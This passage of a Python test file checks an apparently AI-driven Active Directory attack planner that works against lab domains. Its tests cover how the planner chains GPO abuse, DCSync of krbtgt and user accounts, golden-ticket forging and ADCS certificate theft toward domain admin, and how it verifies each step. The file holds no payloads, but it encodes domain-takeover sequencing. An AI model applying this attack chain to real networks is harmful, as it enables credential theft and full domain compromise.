import json
import base64
import re
import sys
from dataclasses import asdict
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "ai" / "langgraph"))
import capabilities  # noqa: E402
import engagement_state as es  # noqa: E402

NOW = "2026-06-10T12:00:00Z"
TTL = 600


def _foothold(forest="lab.local", alive=True, callback_id="7", agent="generic-agent", identity=None):
    return es.Foothold(
        callback_id=callback_id,
        agent=agent,
        host="WS01",
        forest=forest,
        identity=identity or f"LAB\\operator",
        integrity="medium",
        alive=alive,
        source="test",
        timestamp=NOW,
    )


def _fact(predicate):
    return es.GraphFact(predicate=predicate, source="bloodhound:cypher", timestamp=NOW, ttl_seconds=TTL)


def _hop(effect, satisfied_effects=None):
    return es.Hop(
        id="seed",
        technique="seed",
        target="seed",
        effect=effect,
        status="achieved",
        evidence={"provenance": "run"},
        preconditions=[],
        satisfied_effects=satisfied_effects or [effect],
        source="test",
        timestamp=NOW,
    )


def _failed_hop(effect):
    return es.Hop(
        id=f"failed:{effect}",
        technique="seed",
        target="seed",
        effect=effect,
        status="failed",
        evidence={"provenance": "test", "verify_reason": "no DCSync secret evidence"},
        preconditions=[],
        satisfied_effects=[effect],
        source="test",
        timestamp=NOW,
    )


def test_gpo_controlled_system_exec_candidate_is_generic():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
            _fact("gpo-guid:workstation-policy:0a93e998-2599-4da8-9717-6744993ded3a"),
            _fact("gpo-affects-dc:workstation-policy:dc01:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert len(actions) == 1
    action = actions[0]
    assert action.name == "gpo-controlled-system-exec"
    assert action.target == "gpo=workstation-policy;domain=lab.local"
    assert "generic-write:gpo:workstation-policy" in action.preconditions
    assert "gpo-domain:workstation-policy:lab.local" in action.preconditions
    assert "live-foothold:lab.local" in action.preconditions
    assert action.effects == ["system-exec:gpo:workstation-policy@lab.local", "da:lab.local"]
    assert action.intent["gpo"] == "workstation-policy"
    assert action.intent["domain"] == "lab.local"
    assert action.intent["gpo_guid"] == "0a93e998-2599-4da8-9717-6744993ded3a"
    assert action.intent["affected_dc_hosts"] == ["dc01"]
    assert action.intent["preferred_effect"] == "domain-admin-membership"
    assert "gpo-affects-dc:workstation-policy:dc01:lab.local" in action.source_facts
    assert "BloodHound scope includes DC host(s): dc01" in action.reason


def test_gpo_candidate_accepts_equivalent_netbios_foothold_domain():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("corp", identity="CORP\\operator")],
        graph_facts=[
            _fact("generic-write:gpo:domain-policy"),
            _fact("gpo-domain:domain-policy:corp.example.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert [action.name for action in actions] == ["gpo-controlled-system-exec"]
    assert actions[0].target == "gpo=domain-policy;domain=corp.example.local"


def test_gpo_capability_requires_domain_link_and_live_access():
    missing_domain = es.EngagementState(
        objective="x",
        footholds=[_foothold("lab.local")],
        graph_facts=[_fact("generic-write:gpo:workstation-policy")],
    )
    dead_access = es.EngagementState(
        objective="x",
        footholds=[_foothold("lab.local", alive=False)],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )

    assert capabilities.actions_from_state(missing_domain) == []
    assert capabilities.actions_from_state(dead_access) == []


def test_gpo_capability_does_not_assume_legacy_gpo_abuse_is_system_exec():
    state = es.EngagementState(
        objective="x",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system:workstation-policy")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert len(actions) == 1
    assert "SYSTEM execution still needs proof" in actions[0].reason


def test_legacy_gpo_capability_suppressed_after_downstream_domain_proof():
    state = es.EngagementState(
        objective="x",
        footholds=[_foothold("lab.local")],
        hops=[
            _hop("system:workstation-policy"),
            _hop("krbtgt-hash:lab.local"),
        ],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert "gpo-controlled-system-exec" not in [action.name for action in actions]


def test_gpo_capability_suppressed_after_downstream_domain_proof_even_if_gpo_attempt_failed():
    failed_gpo = es.Hop(
        id="failed-gpo",
        technique="gpo-abuse",
        target="{0a93e998-2599-4da8-9717-6744993ded3a}",
        effect="system:{0a93e998-2599-4da8-9717-6744993ded3a}",
        status="failed",
        evidence={"provenance": "run"},
        preconditions=[],
        satisfied_effects=[],
        source="test",
        timestamp=NOW,
    )
    state = es.EngagementState(
        objective="x",
        footholds=[_foothold("lab.local")],
        hops=[
            failed_gpo,
            _hop("da:lab.local"),
        ],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert "gpo-controlled-system-exec" not in [action.name for action in actions]


def test_render_engagement_state_includes_capability_actions_before_legacy_hops():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )

    # Stage B: capability actions are no longer RENDERED (planning is retired). The capability
    # FUNCTION still surfaces the action for the kept consumers; the observed-state render omits it.
    capability_lines = capabilities.render_capability_actions(state)
    assert any("gpo-controlled-system-exec -> gpo=workstation-policy;domain=lab.local" in line for line in capability_lines)

    rendered = es.render_engagement_state(state)
    assert "NEXT CAPABILITY ACTIONS" not in rendered
    assert "gpo-controlled-system-exec ->" not in rendered


def test_render_engagement_state_keeps_next_capability_when_history_is_long():
    long_history = [
        es.Hop(
            id=f"long-{idx}",
            technique=f"very-long-completed-technique-name-{idx}",
            target="completed-target-with-lots-of-context-" + ("x" * 80),
            effect=f"completed-effect-{idx}-" + ("y" * 80),
            status="achieved",
            evidence={"provenance": "run"},
            preconditions=[],
            satisfied_effects=[f"completed-effect-{idx}"],
            source="test",
            timestamp=NOW,
        )
        for idx in range(30)
    ]
    state = es.EngagementState(
        objective="essos domain admin",
        footholds=[_foothold("essos.local", callback_id="2")],
        hops=[
            _hop("local-admin:braavos@essos.local"),
            _hop("remote-exec:braavos@essos.local"),
            *long_history,
        ],
    )

    # Stage B: the observed-state render still bounds (truncates) long history; capability actions
    # are no longer rendered, but the capability FUNCTION still surfaces the next action directly.
    rendered = es.render_engagement_state(state)
    assert "… (truncated)" in rendered
    assert "NEXT CAPABILITY ACTIONS" not in rendered

    capability_lines = capabilities.render_capability_actions(state)
    assert any("adcs-ca-private-key-export -> target=braavos;target_domain=essos.local;callback=2" in line for line in capability_lines)


def test_verify_gpo_controlled_system_exec_requires_system_proof_for_achieved():
    achieved = capabilities.verify_gpo_controlled_system_exec({"system_callback_observed": True})
    partial = capabilities.verify_gpo_controlled_system_exec({
        "scheduled_task_xml_valid": True,
        "gpt_ini_version_bumped": True,
        "ldap_version_bumped": True,
        "command_path_present": True,
    })
    blocked = capabilities.verify_gpo_controlled_system_exec({
        "scheduled_task_xml_valid": True,
        "defender_blocked": True,
    })
    failed = capabilities.verify_gpo_controlled_system_exec({"scheduled_task_xml_valid": False})

    assert achieved.verdict == "achieved"
    assert partial.verdict == "partial"
    assert blocked.verdict == "blocked"
    assert failed.verdict == "failed"


def test_grant_directory_rights_candidate_requires_verified_system_exec():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)
    grants = [action for action in actions if action.name == "grant-directory-rights"]

    assert len(grants) == 1
    grant = grants[0]
    assert grant.target == "domain=lab.local;source=gpo-system-exec:workstation-policy"
    assert grant.preconditions == [
        "system-exec:gpo:workstation-policy@lab.local",
        "live-foothold:lab.local",
    ]
    assert grant.effects == ["ds-replication-rights:lab.local"]
    assert grant.intent["domain"] == "lab.local"
    assert grant.intent["execution_context"] == "gpo-system-exec:workstation-policy"


def test_grant_directory_rights_candidate_suppressed_when_rights_verified():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[
            _hop("system-exec:gpo:workstation-policy@lab.local"),
            _hop("ds-replication-rights:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert "grant-directory-rights" not in [action.name for action in actions]


def test_netbios_da_dominates_fqdn_grant_and_selects_context_refresh():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("north", callback_id="2", identity="NORTH\\samwell.tarly")],
        hops=[
            _hop("system-exec:gpo:workstation-policy@north.example.local"),
            _hop("da:north"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert "grant-directory-rights" not in [action.name for action in actions]
    refresh = next(action for action in actions if action.name == "ensure-kerberos-context")
    assert refresh.target == "domain=north.example.local;callback=2"
    assert refresh.preconditions == ["da:north", "live-callback:2"]
    assert refresh.effects == ["kerberos-context:north.example.local@callback:2"]


def test_netbios_da_suppresses_redundant_same_domain_ticket_forge():
    state = es.EngagementState(
        objective="continue trust path",
        footholds=[_foothold("north", callback_id="2", identity="NORTH\\samwell.tarly")],
        hops=[
            _hop("system-exec:gpo:workstation-policy@north.example.local"),
            _hop("da:north"),
            _hop("krbtgt-hash:north.example.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert not any(
        action.name == "forge-golden-ticket"
        and action.target == "domain=north.example.local"
        for action in actions
    )


def test_grant_directory_rights_candidate_suppressed_after_krbtgt_recovered():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[
            _hop("system-exec:gpo:workstation-policy@lab.local"),
            _hop("krbtgt-hash:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert "grant-directory-rights" not in [action.name for action in actions]


def test_legacy_gpo_abuse_does_not_unlock_grant_directory_rights():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system:workstation-policy")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert "grant-directory-rights" not in [action.name for action in actions]


def test_render_includes_grant_after_system_exec():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
    )

    # Stage B: planning lines (incl. grant-after-system-exec) are no longer rendered; the capability
    # FUNCTION still surfaces the grant action for the kept consumers.
    capability_lines = capabilities.render_capability_actions(state)
    assert any("grant-directory-rights -> domain=lab.local;source=gpo-system-exec:workstation-policy" in line for line in capability_lines)

    rendered = es.render_engagement_state(state)
    assert "grant-directory-rights ->" not in rendered


def test_verify_grant_directory_rights_requires_acl_evidence():
    achieved = capabilities.verify_grant_directory_rights({"ds_replication_rights": True})
    partial = capabilities.verify_grant_directory_rights({
        "get_changes": True,
        "get_changes_all": False,
    })
    blocked = capabilities.verify_grant_directory_rights({
        "ace_present": True,
        "access_denied": True,
    })
    failed = capabilities.verify_grant_directory_rights({})

    assert achieved.verdict == "achieved"
    assert partial.verdict == "partial"
    assert blocked.verdict == "blocked"
    assert failed.verdict == "failed"


def test_record_capability_result_requires_achieved_verdict_for_effect():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]

    partial_state, partial = capabilities.record_capability_result(
        state,
        action,
        {
            "scheduled_task_xml_valid": True,
            "gpt_ini_version_bumped": True,
            "ldap_version_bumped": True,
            "command_path_present": True,
        },
        NOW,
    )

    assert partial.verdict == "partial"
    assert "system-exec:gpo:workstation-policy@lab.local" not in partial_state.achieved_effects()
    assert partial_state.hops[0].status == "failed"
    assert partial_state.hops[0].evidence["verify_verdict"] == "partial"

    achieved_state, achieved = capabilities.record_capability_result(
        partial_state,
        action,
        {"system_callback_observed": True},
        NOW,
        evidence={"mythic_task_id": 4242},
    )

    assert achieved.verdict == "achieved"
    assert "system-exec:gpo:workstation-policy@lab.local" in achieved_state.achieved_effects()
    hop = achieved_state.hops[0]
    assert hop.technique == "capability:gpo-controlled-system-exec"
    assert hop.effect == "system-exec:gpo:workstation-policy@lab.local"
    assert hop.evidence["mythic_task_id"] == 4242


def test_recorded_grant_capability_unlocks_generic_dcsync():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
    )
    grant = next(action for action in capabilities.actions_from_state(state) if action.name == "grant-directory-rights")

    updated, verification = capabilities.record_capability_result(
        state,
        grant,
        {"ds_replication_rights": True},
        NOW,
    )

    assert verification.verdict == "achieved"
    assert "ds-replication-rights:lab.local" in updated.achieved_effects()
    dcsync = [action for action in capabilities.actions_from_state(updated) if action.name == "dcsync-krbtgt"]
    assert len(dcsync) == 1
    assert dcsync[0].target == "domain=lab.local;account=krbtgt"
    assert dcsync[0].effects == ["krbtgt-hash:lab.local"]
    assert "ds-replication-rights:lab.local" in dcsync[0].preconditions


def test_record_kerberos_context_accepts_callback_id_from_evidence():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:child.root.local"),
            _hop("da:root.local"),
        ],
    )
    action = next(
        item for item in capabilities.actions_from_state(state)
        if item.name == "ensure-kerberos-context"
    )

    updated, verification = capabilities.record_capability_result(
        state,
        action,
        {"service_access_proven": True},
        NOW,
        evidence={"callback_id": "13", "mythic_task_id": 416},
    )

    assert verification.verdict == "achieved"
    assert "kerberos-context:root.local@callback:13" in updated.achieved_effects()
    hop = updated.hops[-1]
    assert hop.evidence["callback_id"] == "13"
    assert hop.evidence["mythic_task_id"] == 416


def test_cross_domain_ensure_context_records_admin_coeffect_and_unlocks_dcsync():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[_hop("krbtgt-hash:child.root.local")],
    )
    action = capabilities.CapabilityAction(
        name="ensure-kerberos-context",
        target="domain=root.local;callback=13;source_domain=child.root.local",
        preconditions=[
            "krbtgt-hash:child.root.local",
            "live-callback:13",
        ],
        effects=["kerberos-context:root.local@callback:13"],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": "root.local",
            "target_domain": "root.local",
            "source_domain": "child.root.local",
            "callback_id": "13",
        },
    )

    updated, verification = capabilities.record_capability_result(
        state,
        action,
        {"service_access_proven": True},
        NOW,
        evidence={"callback_id": "13", "mythic_task_id": 419},
    )

    assert verification.verdict == "achieved"
    assert "da:root.local" in updated.achieved_effects()
    assert "kerberos-context:root.local@callback:13" in updated.achieved_effects()
    hop = updated.hops[-1]
    assert hop.satisfied_effects == [
        "da:root.local",
        "kerberos-context:root.local@callback:13",
    ]
    dcsync = [
        item for item in capabilities.actions_from_state(updated)
        if item.name == "dcsync-krbtgt" and "root.local" in item.target
    ]
    assert len(dcsync) == 1


def test_record_forge_ticket_service_proof_records_callback_scoped_context():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[_hop("krbtgt-hash:child.root.local")],
    )
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=child.root.local;target_domain=root.local",
        preconditions=["krbtgt-hash:child.root.local"],
        effects=["da:root.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
        },
    )

    updated, verification = capabilities.record_capability_result(
        state,
        action,
        {"ticket_valid": True},
        NOW,
        evidence={"callback_id": "13", "mythic_task_id": 417},
    )

    assert verification.verdict == "achieved"
    assert "da:root.local" in updated.achieved_effects()
    assert "kerberos-context:root.local@callback:13" in updated.achieved_effects()
    hop = updated.hops[-1]
    assert hop.satisfied_effects == [
        "da:root.local",
        "kerberos-context:root.local@callback:13",
    ]


def test_record_forge_ticket_does_not_record_da_from_generic_service_access_only():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[_hop("krbtgt-hash:child.root.local")],
    )
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=child.root.local;target_domain=root.local",
        preconditions=["krbtgt-hash:child.root.local"],
        effects=["da:root.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
        },
    )

    updated, verification = capabilities.record_capability_result(
        state,
        action,
        {"service_access_proven": True},
        NOW,
        evidence={"callback_id": "13", "mythic_task_id": 418},
    )

    assert verification.verdict == "partial"
    assert "da:root.local" not in updated.achieved_effects()


def test_record_adcs_certificate_auth_current_context_records_specific_effect():
    state = es.EngagementState(
        objective="obtain administrative control of essos.local",
        footholds=[_foothold("essos.local", callback_id="2")],
        hops=[_hop("adcs-ca-private-key:braavos@essos.local")],
    )
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "essos.local",
            "account": "administrator",
        },
    )

    updated, verification = capabilities.record_capability_result(
        state,
        action,
        {
            "account": "administrator",
            "domain": "essos.local",
            "callback_id": "2",
            "pkinit_tgt_present": True,
            "service_access_proven": True,
        },
        NOW,
        evidence={"provenance": "current_context_preflight", "mythic_task_id": 286},
    )

    assert verification.verdict == "achieved"
    assert "da:essos.local" in updated.achieved_effects()
    assert "certificate-auth:administrator@essos.local" in updated.achieved_effects()
    assert "kerberos-context:essos.local@callback:2" in updated.achieved_effects()
    hop = updated.hops[-1]
    assert hop.technique == "capability:adcs-certificate-auth"
    assert hop.satisfied_effects == [
        "da:essos.local",
        "certificate-auth:administrator@essos.local",
        "kerberos-context:essos.local@callback:2",
    ]
    assert hop.evidence["provenance"] == "current_context_preflight"
    assert hop.evidence["mythic_task_id"] == 286


def test_record_adcs_certificate_auth_ntlm_material_does_not_record_kerberos_context():
    state = es.EngagementState(
        objective="obtain administrative control of essos.local",
        footholds=[_foothold("north.local", callback_id="2")],
        hops=[_hop("adcs-ca-private-key:braavos@essos.local")],
    )
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "essos.local",
            "account": "administrator",
        },
    )

    updated, verification = capabilities.record_capability_result(
        state,
        action,
        {
            "account": "administrator",
            "domain": "essos.local",
            "callback_id": "2",
            "pkinit_tgt_present": True,
            "ntlm_hash_present": True,
            "service_access_proven": False,
            "ticket_imported": False,
            "ticket_context_created": False,
        },
        NOW,
        evidence={"provenance": "run", "mythic_task_id": 291},
    )

    achieved = updated.achieved_effects()
    assert verification.verdict == "achieved"
    assert "da:essos.local" in achieved
    assert "certificate-auth:administrator@essos.local" in achieved
    assert "creds:administrator@essos.local" in achieved
    assert "kerberos-context:essos.local@callback:2" not in achieved
    hop = updated.hops[-1]
    assert hop.satisfied_effects == [
        "da:essos.local",
        "certificate-auth:administrator@essos.local",
        "creds:administrator@essos.local",
    ]


def test_record_adcs_certificate_auth_rejects_generic_service_access_only():
    state = es.EngagementState(
        objective="obtain administrative control of essos.local",
        footholds=[_foothold("essos.local", callback_id="2")],
        hops=[_hop("adcs-ca-private-key:braavos@essos.local")],
    )
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "essos.local",
            "account": "administrator",
        },
    )

    updated, verification = capabilities.record_capability_result(
        state,
        action,
        {
            "account": "administrator",
            "domain": "essos.local",
            "callback_id": "2",
            "service_access_proven": True,
        },
        NOW,
        evidence={"provenance": "current_context_preflight", "mythic_task_id": 286},
    )

    assert verification.verdict == "partial"
    assert "da:essos.local" not in updated.achieved_effects()
    hop = updated.hops[-1]
    assert hop.status == "failed"
    assert hop.evidence["verify_reason"] == "service access was proven, but no certificate-auth-specific proof was present"


def test_certificate_auth_admin_material_prompts_account_context_before_dcsync():
    state = es.EngagementState(
        objective="obtain control credential-target:cersei.lannister@sevenkingdoms.local",
        footholds=[_foothold("north.local", callback_id="13")],
        hops=[
            _hop(
                "da:essos.local",
                [
                    "da:essos.local",
                    "certificate-auth:administrator@essos.local",
                    "creds:administrator@essos.local",
                ],
            ),
        ],
    )

    actions = capabilities.actions_from_state(state)

    account_contexts = [
        action for action in actions
        if action.name == "ensure-account-kerberos-context"
        and "domain=essos.local;account=administrator;callback=13" in action.target
    ]
    dcsync = [action for action in actions if action.name == "dcsync-krbtgt" and "essos.local" in action.target]
    assert account_contexts
    assert not dcsync


def test_da_without_live_context_prompts_callback_scoped_context_not_dcsync():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:child.root.local"),
            _hop("da:root.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)
    ensure = [action for action in actions if action.name == "ensure-kerberos-context"]
    dcsync = [action for action in actions if action.name == "dcsync-krbtgt" and "root.local" in action.target]

    assert len(ensure) == 1
    action = ensure[0]
    assert action.target == "domain=root.local;callback=13;source_domain=child.root.local"
    assert action.effects == ["kerberos-context:root.local@callback:13"]
    assert action.intent["domain"] == "root.local"
    assert action.intent["source_domain"] == "child.root.local"
    assert action.intent["callback_id"] == "13"
    assert dcsync == []


def test_live_callback_context_unlocks_dcsync_from_durable_da():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:child.root.local"),
            _hop("da:root.local"),
            _hop("kerberos-context:root.local@callback:13"),
        ],
    )

    actions = capabilities.actions_from_state(state)
    dcsync = [action for action in actions if action.name == "dcsync-krbtgt" and "root.local" in action.target]

    assert len(dcsync) == 1
    assert "kerberos-context:root.local@callback:13" in dcsync[0].preconditions
    assert "ensure-kerberos-context" not in [action.name for action in actions]


def test_credential_target_fact_unlocks_dcsync_account_with_replication_rights():
    state = es.EngagementState(
        objective="use account key for next objective",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("ds-replication-rights:lab.local")],
        graph_facts=[_fact("credential-target:alice@lab.local")],
    )

    actions = capabilities.actions_from_state(state)
    dcsync = [action for action in actions if action.name == "dcsync-account"]

    assert len(dcsync) == 1
    action = dcsync[0]
    assert action.target == "domain=lab.local;account=alice"
    assert action.effects == ["creds:alice@lab.local"]
    assert action.intent["capability"] == "dcsync-account"
    assert action.intent["domain"] == "lab.local"
    assert action.intent["account"] == "alice"
    assert "credential-target:alice@lab.local" in action.source_facts


def test_da_with_live_context_unlocks_dcsync_account_target():
    state = es.EngagementState(
        objective="credential-target:alice@root.local",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:child.root.local"),
            _hop("da:root.local"),
            _hop("kerberos-context:root.local@callback:13"),
        ],
        graph_facts=[_fact("credential-target:alice@root.local")],
    )

    actions = capabilities.actions_from_state(state)
    dcsync = [action for action in actions if action.name == "dcsync-account"]

    assert len(dcsync) == 1
    assert dcsync[0].target == "domain=root.local;account=alice"
    assert "kerberos-context:root.local@callback:13" in dcsync[0].preconditions
    assert "kerberos-context:root.local@callback:13" in dcsync[0].source_facts


def test_stale_callback_context_prompts_context_before_dcsync_account():
    state = es.EngagementState(
        objective="credential-target:alice@root.local",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:child.root.local"),
            _hop("krbtgt-hash:root.local"),
            _hop("da:root.local", ["da:root.local", "kerberos-context:root.local@callback:13"]),
            _hop("kerberos-context:child.root.local@callback:13"),
        ],
        graph_facts=[_fact("credential-target:alice@root.local")],
    )

    actions = capabilities.actions_from_state(state)
    dcsync = [action for action in actions if action.name == "dcsync-account"]
    contexts = [action for action in actions if action.name == "ensure-kerberos-context"]

    assert dcsync == []
    assert contexts
    assert contexts[0].target == "domain=root.local;callback=13"
    assert contexts[0].intent["source_domain"] == "root.local"


def test_da_without_context_prompts_context_before_dcsync_account():
    state = es.EngagementState(
        objective="credential-target:alice@root.local",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:child.root.local"),
            _hop("da:root.local"),
        ],
        graph_facts=[_fact("credential-target:alice@root.local")],
    )

    actions = capabilities.actions_from_state(state)

    assert [action.name for action in actions].count("ensure-kerberos-context") == 1
    assert "dcsync-account" not in [action.name for action in actions]


def test_dcsync_account_target_suppressed_when_creds_verified():
    state = es.EngagementState(
        objective="credential-target:alice@lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("ds-replication-rights:lab.local"),
            _hop("creds:alice@lab.local"),
        ],
        graph_facts=[_fact("credential-target:alice@lab.local")],
    )

    assert "dcsync-account" not in [action.name for action in capabilities.actions_from_state(state)]


def test_netbios_qualified_credential_effect_canonicalizes_for_next_actions():
    state = es.EngagementState(
        objective="credential-target:cersei.lannister@sevenkingdoms.local",
        footholds=[_foothold("north.sevenkingdoms.local", callback_id="13")],
        hops=[_hop(r"creds:sevenkingdoms\cersei.lannister@sevenkingdoms.local")],
    )

    actions = capabilities.actions_from_state(state)
    account_context = [action for action in actions if action.name == "ensure-account-kerberos-context"]

    assert "dcsync-account" not in [action.name for action in actions]
    assert account_context
    assert account_context[0].target == "domain=sevenkingdoms.local;account=cersei.lannister;callback=13"


def test_recovered_account_creds_unlock_account_kerberos_context():
    state = es.EngagementState(
        objective="use recovered account",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("creds:alice@lab.local")],
    )

    actions = capabilities.actions_from_state(state)
    account_context = [action for action in actions if action.name == "ensure-account-kerberos-context"]

    assert len(account_context) == 1
    action = account_context[0]
    assert action.target == "domain=lab.local;account=alice;callback=13"
    assert action.preconditions == ["creds:alice@lab.local", "live-callback:13"]
    assert action.effects == ["kerberos-account-context:alice@lab.local@callback:13"]
    assert action.intent["account"] == "alice"


def test_account_kerberos_context_suppressed_when_already_verified():
    state = es.EngagementState(
        objective="use recovered account",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("creds:alice@lab.local"),
            _hop("kerberos-account-context:alice@lab.local@callback:13"),
        ],
    )

    assert "ensure-account-kerberos-context" not in [
        action.name for action in capabilities.actions_from_state(state)
    ]


def test_dead_callback_context_does_not_unlock_dcsync():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("child.root.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:child.root.local"),
            _hop("da:root.local"),
            _hop("kerberos-context:root.local@callback:11"),
        ],
    )

    actions = capabilities.actions_from_state(state)
    ensure = [action for action in actions if action.name == "ensure-kerberos-context"]
    dcsync = [action for action in actions if action.name == "dcsync-krbtgt" and "root.local" in action.target]

    assert len(ensure) == 1
    assert ensure[0].effects == ["kerberos-context:root.local@callback:13"]
    assert dcsync == []


def test_dcsync_capability_suppressed_when_krbtgt_hash_verified():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[
            _hop("ds-replication-rights:lab.local"),
            _hop("krbtgt-hash:lab.local"),
        ],
    )

    assert "dcsync-krbtgt" not in [action.name for action in capabilities.actions_from_state(state)]


def test_krbtgt_hash_unlocks_forge_golden_ticket_action():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("krbtgt-hash:lab.local")],
    )

    actions = capabilities.actions_from_state(state)
    forge = [action for action in actions if action.name == "forge-golden-ticket"]

    assert len(forge) == 1
    assert forge[0].target == "domain=lab.local"
    assert forge[0].preconditions == ["krbtgt-hash:lab.local"]
    assert forge[0].effects == ["da:lab.local"]


def test_same_domain_da_unlocks_keyless_kerberos_context_refresh():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("da:lab.local")],
    )

    actions = capabilities.actions_from_state(state)
    contexts = [action for action in actions if action.name == "ensure-kerberos-context"]

    assert len(contexts) == 1
    assert contexts[0].target == "domain=lab.local;callback=13"
    assert contexts[0].effects == ["kerberos-context:lab.local@callback:13"]
    assert contexts[0].preconditions == ["da:lab.local", "live-callback:13"]
    assert contexts[0].intent["refresh_current_context"] is True
    assert "krbtgt-hash:lab.local" not in contexts[0].preconditions


def test_same_domain_da_with_krbtgt_still_prefers_current_context_refresh():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:lab.local"),
            _hop("da:lab.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)
    contexts = [action for action in actions if action.name == "ensure-kerberos-context"]

    assert len(contexts) == 1
    assert contexts[0].target == "domain=lab.local;callback=13"
    assert contexts[0].intent["refresh_current_context"] is True
    assert "krbtgt-hash:lab.local" not in contexts[0].preconditions


def test_multi_callback_context_frontier_prefers_latest_proven_execution_callback():
    state = es.EngagementState(
